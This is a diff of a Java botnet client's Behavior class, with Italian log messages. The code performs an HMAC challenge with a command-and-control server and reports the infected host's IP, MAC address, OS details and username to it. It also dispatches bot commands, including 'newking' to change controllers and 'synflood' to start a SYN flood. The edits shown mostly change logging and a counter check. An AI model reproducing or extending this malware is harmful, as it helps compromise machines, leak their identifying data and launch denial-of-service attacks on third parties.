@@ -92,7 +92,7 @@ public class Behavior {
 		if (response != null) {
 			response.forEach(ob -> System.out.println("Vicinato " + ob.getValue1().toString()));
 		} else
-			System.out.println("Risposta vicini null");
+			System.out.println("Risposta vicinato null");
 		newNeighbours = nServ.tramsuteNeigha(response);
 		if (newNeighbours != null) {
 			newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
@@ -125,10 +125,11 @@ public class Behavior {
 					String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 					System.out.println("Hmac calcolato: "+hashMac);
 					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(), nServ.isElegible());
-					System.out.println("La risposta del C&C: " + response);
+					System.out.println("Risultato challenge con C&C: " + response);
 					flag = false;
 					return true;
 				} else {
+					System.out.println("Risultato challenge con C&C: " + true+" il C&C mi conosce ");
 					return true;
 				}
 			}
@@ -213,13 +214,11 @@ public class Behavior {
 	private void executeCommand(String msg) {
 		System.out.println("Eseguendo comando " + msg);
 		if (msg.startsWith("newking")) {
-			if (nServ.getCounterCeCMemory() != null) {
 				if (nServ.getCounterCeCMemory() == 1) {
 					clearCecDatabase();
-					nServ.setCounterCeCMemory(null);
+					nServ.setCounterCeCMemory(-1);
 				}
 				updateCecInfo(msg);
-			}
 		}
 		if (msg.startsWith("synflood")) {
 			// scompongo messaggio al fine di riempire i campi, codifica
